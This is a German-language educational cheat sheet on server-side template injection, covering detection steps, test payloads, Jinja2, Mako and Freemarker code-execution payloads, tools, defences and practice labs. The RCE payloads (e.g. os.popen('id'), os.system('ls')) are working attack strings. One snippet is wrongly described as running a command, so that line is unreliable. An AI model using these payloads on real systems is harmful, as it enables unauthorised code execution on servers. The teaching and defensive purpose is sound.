# 🧩 SSTI – Server-Side Template Injection



## Inhaltsverzeichnis
- [Was ist SSTI?](#was-ist-ssti)
- [Typische Template Engines](#typische-template-engines)
- [Wie erkennt man SSTI?](#wie-erkennt-man-ssti)
- [Typische Test-Payloads](#typische-test-payloads)
- [Exploits: Jinja2 RCE (Python)](#exploits-jinja2-rce-python)
- [SSTI Cheat-Sheet: Template Engines](#ssti-cheat-sheet-template-engines)
- [Tools zur Unterstützung](#tools-zur-unterstützung)
- [Schutzmaßnahmen](#schutzmaßnahmen)
- [Beispiele aus der Praxis](#beispiele-aus-der-praxis)
- [Lerne & Übe SSTI](#lerne--übe-ssti)
- [Weiterführende Links](#weiterführende-links)
- [Haftungsausschluss](#haftungsausschluss)



## Was ist SSTI?

**Server-Side Template Injection (SSTI)** bezeichnet eine Schwachstelle, bei der ein Angreifer serverseitige Template-Engines manipulieren kann, um beliebige Ausdrücke auszuführen. Das passiert, wenn Benutzereingaben ohne Filterung in Templates eingebunden werden.

> 🔥 In vielen Fällen führt SSTI zu **Remote Code Execution (RCE)** auf dem Server.



## Typische Template Engines

| Sprache  | Engine             | Erkennbar an…             |
|----------|--------------------|----------------------------|
| Python   | Jinja2, Mako        | `{{7*7}}`, `{% for %}`     |
| PHP      | Twig, Smarty        | `{{ 'PHP' }}`              |
| Java     | Freemarker, Velocity | `${7*7}`, `#set($var=7)`   |
| JavaScript | EJS, Handlebars   | `{{7*7}}`                  |
| Ruby     | ERB, Liquid         | `<%= 7*7 %>`               |


<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Wie erkennt man SSTI?

### Schritt-für-Schritt-Erkennung

1. **Füge einfache Payloads ein:**
   - `{{7*7}}`
   - `${7*7}`
   - `<%= 7*7 %>`
   - `*{{constructor.constructor("alert(1)")()}}*` (JS)

2. **Prüfe auf gerenderte Ergebnisse:**
   - Wird `49` angezeigt? → **SSTI vorhanden**
   - Wird der Ausdruck als Text zurückgegeben? → vermutlich keine SSTI



## Typische Test-Payloads

| Payload       | Bedeutung                      |
|---------------|-------------------------------|
| `{{7*7}}`      | Arithmetischer Test           |
| `{{self}}`     | Zugriff auf interne Objekte  |
| `{{config}}`   | Zugriff auf Konfiguration     |
| `${{7*7}}`     | Freemarker Payload            |
| `<%= 7*7 %>`   | Ruby ERB                      |



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Exploits: Jinja2 RCE (Python)

```jinja2
{{''.__class__.__mro__[1].__subclasses__()}}
```
→ Führt id-Befehl aus!

### Kürzer über cycler, joiner:

```jinja2
{{cycler.__init__.__globals__.os.popen('id').read()}}
```



## SSTI Cheat-Sheet: Template Engines

| Engine     | Ausdruck                                                   | RCE möglich?  |
| ---------- | ---------------------------------------------------------- | ------------- |
| Jinja2     | `{{7*7}}`, `{{config}}`                                    | ✅             |
| Mako       | `${7*7}`, `${os.system('ls')}`                             | ✅             |
| Twig       | `{{ 7*7 }}`                                                | eingeschränkt |
| Freemarker | `${7*7}`, `${"freemarker.template.utility.Execute"?new()}` | ✅             |
| ERB        | `<%= 7*7 %>`                                               | ✅             |



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Tools zur Unterstützung

| Tool       | Beschreibung                            |
| ---------- | --------------------------------------- |
| Burp Suite | Manuelle & automatische Tests           |
| tplmap     | Automatisierte SSTI-Erkennung + Exploit |
| WFuzz      | Fuzzing von Parametern                  |
| SSTI-Lab   | Eigene Trainingsumgebung (GitHub)       |



## Schutzmaßnahmen

| Maßnahme                             | Beschreibung                           |
| ------------------------------------ | -------------------------------------- |
| Eingabe validieren                   | Nur erlaubte Zeichen zulassen          |
| Escaping                             | `{% autoescape %}` verwenden           |
| Logik & Templates trennen            | Keine Logik im Template verarbeiten    |
| Keine Userdaten im Template          | Niemals unescaped einfügen             |
| Template Engine sicher konfigurieren | z. B. `sandbox`, kein Zugriff auf eval |




## Beispiele aus der Praxis

| Beispiel                               | Anfälligkeit |
| -------------------------------------- | ------------ |
| Feedback-Form mit Template-Output      | SSTI         |
| Benutzername wird ins Template geladen | SSTI         |
| Fehlermeldungen mit dynamischem Inhalt | SSTI möglich |



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Lerne & Übe SSTI

| Plattform        | Inhalt                         |
| ---------------- | ------------------------------ |
| TryHackMe        | SSTI Room (z. B. „Injection“)  |
| PortSwigger Labs | Web Security Academy           |
| HackTheBox       | Machines: „Jeeves“, „Bashed“   |
| DVWA/bWAPP       | Simulierte SSTI-Schwachstellen |




## Weiterführende Links

- [PayloadsAllTheThings – SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [PortSwigger SSTI Labs](https://portswigger.net/web-security/server-side-template-injection)
- [tplmap Tool](https://github.com/epinna/tplmap)
- [OWASP SSTI Guide](https://owasp.org/www-community/attacks/Server-Side_Template_Injection)



## Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

[Disclaimer](/00-disclaimer/disclaimer.md)

--- 

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** August 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---

